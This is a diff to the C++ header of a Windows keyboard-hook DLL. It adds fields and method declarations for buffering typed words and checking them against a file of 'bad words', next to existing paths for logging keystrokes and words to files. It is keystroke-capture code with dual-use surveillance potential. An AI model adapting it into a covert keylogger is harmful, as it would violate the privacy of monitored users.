@@ -9,6 +9,7 @@
 #include <chrono>
 #include <ctime>
 #include <cctype> // toupper char
+#include <vector>
 
 extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath);
 extern "C" KBHOOKPROC_API void SetModPath(std::string newPath);
@@ -23,14 +24,21 @@ extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
 class WordOfVkeys {
 private:
 	static WordOfVkeys* _instance;
+
 	std::string _whereToWriteKeys;
 	std::string _whereToWriteWords;
 	std::string _whereToReadBadWords;
 
+	std::vector<std::string> _badWordsList;
+	std::string _currWord;
+	bool _isWordAnalysis;
+
 	WordOfVkeys():
 		_whereToWriteKeys(""),
 		_whereToWriteWords(""),
-		_whereToReadBadWords(""){
+		_whereToReadBadWords(""),
+		_currWord(""),
+		_isWordAnalysis(true){
 
 	}
 public:
@@ -45,9 +53,14 @@ public:
 	}
 	void SetWhereToWriteWords(std::string path) {
 		_whereToWriteWords = path;
+
+		_isWordAnalysis = !_whereToWriteWords._Equal("");
 	}
 	void SetWhereToReadBadWords(std::string path) {
 		_whereToReadBadWords = path;
+		ReadBadWords();
+
+		_isWordAnalysis = _badWordsList.size() != 0;
 	}
 
 	bool IsUnPrintableKey(WPARAM vkey);
@@ -59,6 +72,10 @@ private:
 	std::string GetCurrTimeBuff();
 	char GetCharSymbFromVkey(WPARAM vkey, HKL kbLayout);
 	void WriteTofile(std::string fileName, std::string info);
+
+	void ReadBadWords();
+	bool IsCurrWordBad();
+	void AddSymbToWord(char symb);
 };
 
 #endif
